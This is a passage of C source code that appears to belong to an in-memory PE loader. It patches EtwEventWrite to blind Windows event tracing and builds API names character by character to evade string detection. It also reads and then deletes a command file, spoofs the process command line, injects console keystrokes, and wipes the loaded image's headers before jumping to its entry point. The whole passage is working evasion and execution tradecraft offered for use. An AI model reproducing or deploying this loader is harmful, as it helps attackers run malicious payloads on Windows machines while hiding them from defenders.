        char etw[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
        FARPROC pETW = pGPA(hNT, etw);
        if (pETW) {
            DWORD oldETW;
            pVP((LPVOID)pETW, 4, 0x40, &oldETW);
            ((BYTE*)pETW)[0] = 0x33; ((BYTE*)pETW)[1] = 0xC0; ((BYTE*)pETW)[2] = 0xC3;
            pVP((LPVOID)pETW, 4, oldETW, &oldETW);
        }
    }

    {
        PIMAGE_SECTION_HEADER ps = IMAGE_FIRST_SECTION(
            (PIMAGE_NT_HEADERS)((BYTE*)img + ((PIMAGE_DOS_HEADER)img)->e_lfanew));
        for (WORD si = 0; si < nh->FileHeader.NumberOfSections; si++) {
            DWORD ch = ps[si].Characteristics;
            DWORD prot;
            if (ch & 0x20000000) prot = (ch & 0x80000000) ? 0x40 : 0x20;
            else if (ch & 0x80000000) prot = 0x04;
            else prot = 0x02;
            DWORD osp;
            pVP((BYTE*)img + ps[si].VirtualAddress, ps[si].Misc.VirtualSize, prot, &osp);
        }
    }

    char fileCmds[4096];
    fileCmds[0] = 0;
    if (extraArgs[0] == '@') {
        char* fp = extraArgs + 1;
        while (*fp == ' ' || *fp == '"') fp++;
        char fpC[260]; int fi = 0;
        while (fp[fi] && fp[fi] != '"' && fp[fi] != ' ' && fi < 259) { fpC[fi] = fp[fi]; fi++; }
        fpC[fi] = 0;
        HANDLE hCmdF = pCF(fpC, 0x80000000, 1, NULL, 3, 0, NULL);
        if (hCmdF != INVALID_HANDLE_VALUE) {
            char raw[4000]; raw[0] = 0;
            DWORD fSz = pGFS(hCmdF, NULL);
            if (fSz > 0 && fSz < 3990) { DWORD rd; pRF(hCmdF, raw, fSz, &rd, NULL); raw[rd] = 0; }
            pCH(hCmdF);
            char s_dfa[] = {'D','e','l','e','t','e','F','i','l','e','A',0};
            typedef BOOL(WINAPI* fn_DFA)(LPCSTR); fn_DFA pDFA = (fn_DFA)pGPA(hK, s_dfa);
            if (pDFA) pDFA(fpC);
            int out = 0; char* p = raw;
            while (*p && out < 4080) {
                while (*p == '\r' || *p == '\n' || *p == ' ') p++;
                if (!*p) break;
                fileCmds[out++] = '"';
                while (*p && *p != '\r' && *p != '\n' && out < 4080) fileCmds[out++] = *p++;
                fileCmds[out++] = '"';
                fileCmds[out++] = ' ';
            }
            fileCmds[out] = 0;
        }
        extraArgs = fileCmds;
    }

    char logCmds[4200];
    if (logPath[0]) {
        int ci = 0;
        logCmds[ci++] = '"'; logCmds[ci++] = 'l'; logCmds[ci++] = 'o'; logCmds[ci++] = 'g';
        logCmds[ci++] = ' ';
        for (int li = 0; logPath[li] && ci < 4180; li++) logCmds[ci++] = logPath[li];
        logCmds[ci++] = '"'; logCmds[ci++] = ' ';
        for (char* s = extraArgs; *s && ci < 4190; ) logCmds[ci++] = *s++;
        logCmds[ci] = 0;
        extraArgs = logCmds;
    }

    if (*extraArgs) {
        char s_gclw[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','W',0};
        typedef LPWSTR(WINAPI* fn_GCLW)();
        fn_GCLW pGCLW = (fn_GCLW)pGPA(hK, s_gclw);
        char s_mbtwc[] = {'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r',0};
        typedef int(WINAPI* fn_MBTWC)(UINT,DWORD,LPCCH,int,LPWSTR,int);
        fn_MBTWC pMBTWC = (fn_MBTWC)pGPA(hK, s_mbtwc);
        if (pGCLW && pMBTWC) {
            LPWSTR clW = pGCLW();
            char s_gcla2[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','A',0};
            typedef LPSTR(WINAPI* fn_GCLA2)();
            fn_GCLA2 pGCLA2 = (fn_GCLA2)pGPA(hK, s_gcla2);
            LPSTR clA = pGCLA2 ? pGCLA2() : NULL;
            char fakeA[2048];
            fakeA[0]='p'; fakeA[1]='.'; fakeA[2]='e'; fakeA[3]='x'; fakeA[4]='e'; fakeA[5]=' ';
            int ai = 6;
            for (char* s = extraArgs; *s && ai < 2046; s++) {
                if (*s != '"') fakeA[ai++] = *s;
            }
            fakeA[ai] = 0;
            int wLen = pMBTWC(0, 0, fakeA, -1, NULL, 0);
            if (wLen > 0 && wLen <= 1024) {
                pMBTWC(0, 0, fakeA, -1, clW, wLen);
            }
            if (clA) {
                for (int ci = 0; ci < ai; ci++) clA[ci] = fakeA[ci];
                clA[ai] = 0;
            }
        }

        char s_wci[] = {'W','r','i','t','e','C','o','n','s','o','l','e','I','n','p','u','t','W',0};
        char s_gsh[] = {'G','e','t','S','t','d','H','a','n','d','l','e',0};
        typedef BOOL(WINAPI* fn_WCI)(HANDLE, const INPUT_RECORD*, DWORD, LPDWORD);
        typedef HANDLE(WINAPI* fn_GSH)(DWORD);
        fn_WCI pWCI = (fn_WCI)pGPA(hK, s_wci);
        fn_GSH pGSH = (fn_GSH)pGPA(hK, s_gsh);
        if (pWCI && pGSH) {
            HANDLE hIn = pGSH((DWORD)-10);
            char* ea = extraArgs;
            while (*ea) {
                while (*ea == ' ') ea++;
                if (!*ea) break;
                char* s; DWORD n;
                if (*ea == '"') { ea++; s = ea; while (*ea && *ea != '"') ea++; n = (DWORD)(ea - s); if (*ea) ea++; }
                else { s = ea; while (*ea && *ea != ' ') ea++; n = (DWORD)(ea - s); }
                for (DWORD ci = 0; ci < n; ci++) {
                    INPUT_RECORD ir;
                    ir.EventType = KEY_EVENT;
                    ir.Event.KeyEvent.bKeyDown = TRUE;
                    ir.Event.KeyEvent.wRepeatCount = 1;
                    ir.Event.KeyEvent.wVirtualKeyCode = 0;
                    ir.Event.KeyEvent.wVirtualScanCode = 0;
                    ir.Event.KeyEvent.uChar.UnicodeChar = (WCHAR)s[ci];
                    ir.Event.KeyEvent.dwControlKeyState = 0;
                    DWORD wr;
                    pWCI(hIn, &ir, 1, &wr);
                }
                INPUT_RECORD ir;
                ir.EventType = KEY_EVENT;
                ir.Event.KeyEvent.bKeyDown = TRUE;
                ir.Event.KeyEvent.wRepeatCount = 1;
                ir.Event.KeyEvent.wVirtualKeyCode = 0x0D;
                ir.Event.KeyEvent.wVirtualScanCode = 0x1C;
                ir.Event.KeyEvent.uChar.UnicodeChar = L'\r';
                ir.Event.KeyEvent.dwControlKeyState = 0;
                DWORD wr;
                pWCI(hIn, &ir, 1, &wr);
            }
        }
    }

    {
        DWORD hdOld;
        DWORD hdSz = nh->OptionalHeader.SizeOfHeaders;
        ULONG_PTR epRVA = nh->OptionalHeader.AddressOfEntryPoint;

        for (DWORD wi = 0; wi < total; wi++) ((BYTE*)buf)[wi] = 0;

        pVP(img, hdSz, 0x04, &hdOld);
        for (DWORD i = 0; i < hdSz; i++) ((BYTE*)img)[i] = 0;
        pVP(img, hdSz, 0x02, &hdOld);

        ULONG_PTR ep = (ULONG_PTR)img + epRVA;
        ((void(*)())ep)();
    }

    return 0;
}
